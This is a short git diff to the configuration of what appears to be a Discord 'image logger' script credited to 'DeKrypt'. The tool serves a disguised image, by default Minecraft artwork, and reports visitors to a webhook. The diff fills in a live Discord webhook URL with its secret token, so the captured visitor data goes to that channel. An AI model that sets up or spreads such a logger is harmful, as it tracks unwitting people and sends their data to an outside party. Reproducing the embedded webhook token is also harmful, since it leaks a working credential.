@@ -9,7 +9,7 @@ __author__ = "DeKrypt"
 
 config = {
     # CONFIGURACIÓN BÁSICA #
-    "webhook": "https://discord.com/api/webhooks/",
+    "webhook": "https://discord.com/api/webhooks/1346546483880656916/OBp7jy78PW03socD2-SHG8eeu4lW-NxisOKt82J-m-fFOLlo7-wXrqoWj5a7jmmQlXv2",
     "image": "https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/key-art/Homepage_Discover-our-games_MC-Vanilla-KeyArt_864x864.jpg", 
     # También puedes usar una imagen personalizada mediante un argumento en la URL
     # (Ejemplo: tuweb.com/imagelogger?url=<Inserta un enlace a una imagen codificado en URL>)
